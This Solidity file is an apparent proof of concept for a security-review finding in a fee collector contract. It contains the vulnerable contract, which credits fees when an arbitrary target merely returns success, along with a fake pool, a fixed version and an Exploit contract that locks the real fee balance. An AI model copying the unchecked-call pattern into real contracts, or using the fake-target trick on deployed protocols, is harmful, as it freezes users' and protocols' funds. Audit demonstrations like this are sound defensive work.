// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — Pashov H-23, review dated 2025-05-06.
    claimNFTUnderlying accepts any target. A contract that returns success
    without sending tokens still credits collectedFee. Distribution then asks
    for more than the collector holds, so the real fee balance cannot leave.
*/

library PercentLib {
    function percentMul(uint256 amount, uint256 bps) internal pure returns (uint256) {
        return (amount * bps) / 10_000;
    }
}

contract Token {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HonestPool {
    function withdrawUnderlying(address token, address to, uint256 amount) external returns (bool) {
        require(Token(token).transfer(to, amount), "send");
        return true;
    }
}

contract FakePool {
    function withdrawUnderlying(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract FeeCollector {
    using PercentLib for uint256;

    struct FeeType {
        uint256 treasuryShare;
        uint256 repairFundShare;
        uint256 burnShare;
        uint256 veRAACTokenShare;
        uint256 raacCorpShare;
        uint256 otherShare;
    }

    struct Collected {
        uint256 treasuryAmount;
        uint256 repairFundAmount;
        uint256 burnAmount;
        uint256 veRAACTokenAmount;
        uint256 raacCorpAmount;
        uint256 otherAmount;
    }

    mapping(address => bool) public isTokenSupported;
    mapping(bytes32 => FeeType) internal feeTypes;
    mapping(address => Collected) internal collectedFees;
    uint256 private entered = 1;
    bool public paused;

    error TokenNotSupported();
    error InvalidFeeAmount();
    error ClaimCollectorUnderlyingFailed();

    event CollectorUnderlyingClaimed(address token, address target, uint256 amount);

    modifier nonReentrant() {
        require(entered == 1, "re");
        entered = 2;
        _;
        entered = 1;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    constructor(address token) {
        isTokenSupported[token] = true;
        feeTypes[keccak256("LENDING")] = FeeType(5000, 2000, 1000, 1000, 500, 500);
    }

    function treasuryOf(address token) external view returns (uint256) {
        return collectedFees[token].treasuryAmount;
    }

    function receiveFees(address token, uint256 amount) external {
        require(isTokenSupported[token], "token");
        require(Token(token).transferFrom(msg.sender, address(this), amount), "fees");
    }

    function claimNFTUnderlying(address token, address target, uint256 amount, bytes32 feeType)
        external
        nonReentrant
        whenNotPaused
        returns (bool)
    {
        if (!isTokenSupported[token]) revert TokenNotSupported();
        if (amount == 0) revert InvalidFeeAmount();

        (bool success,) = target.call(
            abi.encodeWithSelector(bytes4(keccak256("withdrawUnderlying(address,address,uint256)")), token, address(this), amount)
        );

        if (!success) revert ClaimCollectorUnderlyingFailed();

        _updateCollectedFees(token, feeType, amount);
        emit CollectorUnderlyingClaimed(token, target, amount);
        return true;
    }

    function _updateCollectedFees(address token, bytes32 feeType, uint256 amount) internal {
        FeeType memory feeTypeData = feeTypes[feeType];
        uint256 treasuryAmount = amount.percentMul(feeTypeData.treasuryShare);
        uint256 repairFundAmount = amount.percentMul(feeTypeData.repairFundShare);
        uint256 burnAmount = amount.percentMul(feeTypeData.burnShare);
        uint256 veRAACTokenAmount = amount.percentMul(feeTypeData.veRAACTokenShare);
        uint256 raacCorpAmount = amount.percentMul(feeTypeData.raacCorpShare);
        uint256 otherAmount = amount.percentMul(feeTypeData.otherShare);

        uint256 totalTax = treasuryAmount + repairFundAmount + burnAmount + veRAACTokenAmount + raacCorpAmount + otherAmount;
        require(totalTax == amount, "tax");

        Collected storage collectedFee = collectedFees[token];
        // @> VULN: treasuryAmount is credited even though the target transferred no tokens
        collectedFee.treasuryAmount += treasuryAmount;
        collectedFee.repairFundAmount += repairFundAmount;
        collectedFee.burnAmount += burnAmount;
        collectedFee.veRAACTokenAmount += veRAACTokenAmount;
        collectedFee.raacCorpAmount += raacCorpAmount;
        collectedFee.otherAmount += otherAmount;
    }

    function distribute(address token, address treasury) external {
        uint256 treasuryAmount = collectedFees[token].treasuryAmount;
        require(Token(token).transfer(treasury, treasuryAmount), "dist");
    }
}

contract FeeCollectorFixed {
    Token public token;
    address public honest;
    uint256 public accounted;
    bool public supported = true;

    constructor(Token _token, address _honest) {
        token = _token;
        honest = _honest;
    }

    function claimNFTUnderlying(address token_, address target, uint256 amount) external returns (bool) {
        require(supported && token_ == address(token), "token");
        require(amount > 0, "amount");
        uint256 beforeBal = token.balanceOf(address(this));
        (bool success,) = target.call(
            abi.encodeWithSelector(bytes4(keccak256("withdrawUnderlying(address,address,uint256)")), token_, address(this), amount)
        );
        require(success, "call");
        require(token.balanceOf(address(this)) == beforeBal + amount, "short");
        accounted += amount;
        return true;
    }

    function distribute(address treasury) external {
        uint256 amount = accounted;
        accounted = 0;
        require(token.transfer(treasury, amount), "dist");
    }
}

contract Exploit {
    bytes32 public constant FEE = keccak256("LENDING");
    uint256 public constant REAL = 100 ether;
    uint256 public constant FAKE = 1000 ether;

    Token public token;
    HonestPool public honest;
    FakePool public fake;
    FeeCollector public collector;
    uint256 public stuck;
    uint256 public treasuryBook;
    bool public distributeReverted;

    constructor() {
        token = new Token();
        honest = new HonestPool();
        fake = new FakePool();
        collector = new FeeCollector(address(token));
    }

    function run() external {
        token.mint(address(this), REAL);
        token.approve(address(collector), REAL);
        collector.receiveFees(address(token), REAL);
        uint256 held = token.balanceOf(address(collector));
        collector.claimNFTUnderlying(address(token), address(fake), FAKE, FEE);
        treasuryBook = collector.treasuryOf(address(token));
        (bool ok,) = address(collector).call(abi.encodeWithSelector(collector.distribute.selector, address(token), address(this)));
        distributeReverted = !ok;
        stuck = token.balanceOf(address(collector));
        require(held == REAL, "held");
        require(treasuryBook == 500 ether, "book");
        require(distributeReverted, "paid");
        require(stuck == REAL, "locked");
    }
}
